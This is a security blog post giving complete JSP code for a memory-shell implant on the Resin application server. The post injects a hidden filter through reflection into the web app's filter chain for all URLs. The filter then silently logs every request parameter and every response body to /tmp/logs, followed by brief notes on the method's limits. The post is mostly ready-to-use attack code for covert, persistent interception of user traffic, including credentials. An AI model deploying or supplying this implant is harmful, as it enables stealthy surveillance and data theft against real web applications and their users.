---
title: "Hijacking Resin Request/Response via Filter Injection"
date: 2021-09-22
type: posts
draft: false
summary: "Injecting a filter-based memory shell in Resin to intercept and exfiltrate interface response data."
categories:
  - Web-Security
tags:
  - web
  - resin
  - memshell
  - filter
---

Implementation code. After injection, all response content will be logged to the `/tmp/logs` file:

```java
<%@ page import="java.io.IOException" %>
<%@ page import="com.caucho.server.webapp.WebApp" %>
<%@ page import="com.caucho.server.dispatch.FilterConfigImpl" %>
<%@ page import="com.caucho.server.dispatch.FilterMapping" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.caucho.server.dispatch.FilterMapper" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.io.FileWriter" %>
<%@ page import="java.util.Enumeration" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <title>JSP - Resin Inject Filter</title>
</head>
<body>
<%!
    class CustomResponseWrapper extends HttpServletResponseWrapper {
 
        private ByteArrayOutputStream buffer;
        private ServletOutputStream out;
        private MyPrintWriter out2;
 
        public CustomResponseWrapper(HttpServletResponse response) {
            super(response);
            buffer = new ByteArrayOutputStream();
            out = new WrapperOutputStream(buffer);
            out2 = new MyPrintWriter(buffer);
 
        }
 
        @Override
        public ServletOutputStream getOutputStream() throws IOException {
            return out;
        }
 
        @Override
        public PrintWriter getWriter() throws IOException {
            return out2;
        }
 
        @Override
        public void flushBuffer() throws IOException {
            if (out != null) {
                out.flush();
                out2.flush();
            }
        }
 
        public byte[] getContent() throws IOException {
            flushBuffer();
            return buffer.toByteArray();
        }
 
        class WrapperOutputStream extends ServletOutputStream {
            private ByteArrayOutputStream bos;
 
            public WrapperOutputStream(ByteArrayOutputStream bos) {
                this.bos = bos;
            }
 
            public void write(int b) throws IOException {
                bos.write(b);
            }
 
            public boolean isReady() {
                return false;
            }
 
        }
        class MyPrintWriter extends PrintWriter {
            ByteArrayOutputStream myOutput;
            public MyPrintWriter(ByteArrayOutputStream output) {
                super(output);
                myOutput = output;
            }
 
            public ByteArrayOutputStream getByteArrayOutputStream() {
                return myOutput;
            }
        }
 
    }
 
    public class TestFilter implements Filter {
        public TestFilter() {
        }
 
        @Override
        public void init(FilterConfig arg0) throws ServletException {
            // TODO Auto-generated method stub
        }
 
        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterchain)
                throws IOException, ServletException {
            // TODO Auto-generated method stub
 
 
            FileWriter fw = new FileWriter("/tmp/logs", true);
 
            Enumeration names = request.getParameterNames();
            StringBuilder output = new StringBuilder();
            while(names.hasMoreElements()){
                String name = (String) names.nextElement();
                output.append(name).append("=");
                String values[] = request.getParameterValues(name);
                for (int i = 0; i < values.length; i++) {
                    if (i > 0) {
                        output.append("' ");
                    }
                    output.append(values[i]);
                }
                if (names.hasMoreElements())
                    output.append("&");
            }
            fw.write(output + "\n");
            //fw.write("response.contenttype:" + response.getContentType());
            fw.flush();
 
            CustomResponseWrapper mResp = new CustomResponseWrapper((HttpServletResponse)response);
            filterchain.doFilter(request, mResp);
 
            StringBuilder sb = new StringBuilder();
            byte[] bytes = mResp.getContent();
            sb.append(new String(bytes));
 
            System.out.println("length:" + bytes.length);
            System.out.println("String:" + sb);
            fw.write(sb.toString());
            fw.flush();
            fw.close();
 
            response.setContentLength(-1);
            response.getOutputStream().write(bytes);
            response.getOutputStream().flush();
        }
 
        @Override
        public void destroy() {
            // TODO Auto-generated method stub
        }
    }
%>
<%
    ClassLoader classloader = Thread.currentThread().getContextClassLoader();
 
    Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
    Class filterConfigimplcls  = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
    Class filterMappingcls     = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
    Class filterMappercls      = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");
 
    Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
    WebApp webapp         = (WebApp) contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
 
    TestFilter filter = new TestFilter();
    FilterConfigImpl filterConfig = (FilterConfigImpl) filterConfigimplcls.newInstance();
    filterConfig.setFilterName("test");
    filterConfig.setFilter(filter);
    filterConfig.setFilterClass(filter.getClass());
 
    webapp.addFilter(filterConfig);
 
    FilterMapping            filterMapping           = (FilterMapping) filterMappingcls.newInstance();
    FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
    filterMappingUrlpattern.addText("/*");
    filterMappingUrlpattern.init();
    filterMapping.setFilterName("test");
    filterMapping.setServletContext(webapp);
 
    Field fieldWebappFilterMapper = null;
    try {
        fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
    } catch (NoSuchFieldException Exception) {
        fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
    }
 
    fieldWebappFilterMapper.setAccessible(true);
    FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);
 
    Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
    fieldFilterMapperFilterMap.setAccessible(true);
 
    ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
    ArrayList<FilterMapping> newFilterMappings     = new ArrayList(orginalfilterMappings.size() + 1);
    newFilterMappings.add(filterMapping);
 
    int count = 0;
    while (count < orginalfilterMappings.size()) {
        newFilterMappings.add(orginalfilterMappings.get(count));
        ++count;
    }
 
    fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
    fieldWebappFilterMapper.set(webapp, filtermapper);
 
    out.println("Resin Filter added");
    webapp.getClass().getMethod("clearCache").invoke(webapp);
%>
</body>
</html>
```

In Resin, `WebApp` is analogous to `StandardContext` in Tomcat. By obtaining a WebApp instance and using reflection to modify the internal `_filterMapper` member, filter injection is achieved.

The scope of the filter depends on the WebApp context obtained. Based on current research, only the WebApp context of the current application can be acquired — the global context cannot be obtained.

Through JAR-based injection, testing has shown that the WebApp context cannot be obtained via publicly known methods, making it impossible to modify the filter chain.
